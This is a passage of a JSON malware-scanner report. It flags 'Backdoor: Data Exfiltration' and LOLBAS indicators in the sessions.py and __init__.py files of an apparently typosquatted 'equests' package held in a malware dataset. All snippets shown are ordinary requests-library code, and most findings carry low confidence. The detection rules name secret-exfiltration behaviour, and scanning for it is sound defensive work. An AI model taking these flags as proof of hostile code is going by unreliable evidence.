                  "endLine": 292,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n",
                    "rendered": {
                      "text": "            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n",
                      "markdown": "`            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 709,
                  "startColumn": 29,
                  "endLine": 709,
                  "endColumn": 46,
                  "snippet": {
                    "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                    "rendered": {
                      "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                      "markdown": "`            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 708,
                  "startColumn": 29,
                  "endLine": 708,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                    "rendered": {
                      "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                      "markdown": "`            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 12,
                  "endLine": 701,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n",
                    "rendered": {
                      "text": "        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n",
                      "markdown": "`        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 21,
                  "endLine": 31,
                  "endColumn": 41,
                  "snippet": {
                    "text": "from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n",
                    "rendered": {
                      "text": "from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n",
                      "markdown": "`from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 494,
                  "startColumn": 40,
                  "endLine": 494,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n",
                    "rendered": {
                      "text": "            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n",
                      "markdown": "`            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 12,
                  "endLine": 487,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n",
                    "rendered": {
                      "text": "        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n",
                      "markdown": "`        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 380,
                  "startColumn": 52,
                  "endLine": 380,
                  "endColumn": 60,
                  "snippet": {
                    "text": "        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n",
                    "rendered": {
                      "text": "        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n",
                      "markdown": "`        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 45,
                  "endLine": 123,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                    "rendered": {
                      "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                      "markdown": "`        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 22,
                  "endLine": 123,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                    "rendered": {
                      "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                      "markdown": "`        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 767,
                  "startColumn": 48,
                  "endLine": 767,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n",
                      "markdown": "`\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 673,
                  "startColumn": 49,
                  "endLine": 673,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n",
                    "rendered": {
                      "text": "\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n",
                      "markdown": "`\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 79,
                  "endLine": 377,
                  "endColumn": 83,
                  "snippet": {
                    "text": "        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n",
                    "rendered": {
                      "text": "        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n",
                      "markdown": "`        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 13,
                  "endLine": 155,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n",
                    "rendered": {
                      "text": "        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n",
                      "markdown": "`        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 64,
                  "endLine": 101,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                    "rendered": {
                      "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                      "markdown": "`    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 19,
                  "endLine": 101,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                    "rendered": {
                      "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                      "markdown": "`    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 647,
                  "startColumn": 23,
                  "endLine": 647,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n",
                    "rendered": {
                      "text": "        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n",
                      "markdown": "`        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 15,
                  "endLine": 641,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n",
                    "rendered": {
                      "text": "        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n",
                      "markdown": "`        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 19,
                  "endLine": 556,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n",
                    "rendered": {
                      "text": "        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n",
                      "markdown": "`        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/sessions.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 6,
                  "endLine": 13,
                  "snippet": {
                    "text": "\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n",
                    "rendered": {
                      "text": "\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n",
                      "markdown": "`\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/__init__.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 19,
                  "endLine": 25,
                  "endColumn": 25,
                  "snippet": {
                    "text": "... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n",
                    "rendered": {
                      "text": "... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n",
                      "markdown": "`... or POST:\n\n   >>> payload = dict(key1='value1', key2='value2')\n   >>> r = requests.post('https://httpbin.org/post', data=payload)\n   >>> print(r.text)\n   {\n     ...\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/__init__.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 19,
                  "endLine": 16,
                  "endColumn": 24,
                  "snippet": {
                    "text": "Basic GET usage:\n\n   >>> import requests\n   >>> r = requests.get('https://www.python.org')\n   >>> r.status_code\n   200\n   >>> b'Python is a programming language' in r.content\n",
                    "rendered": {
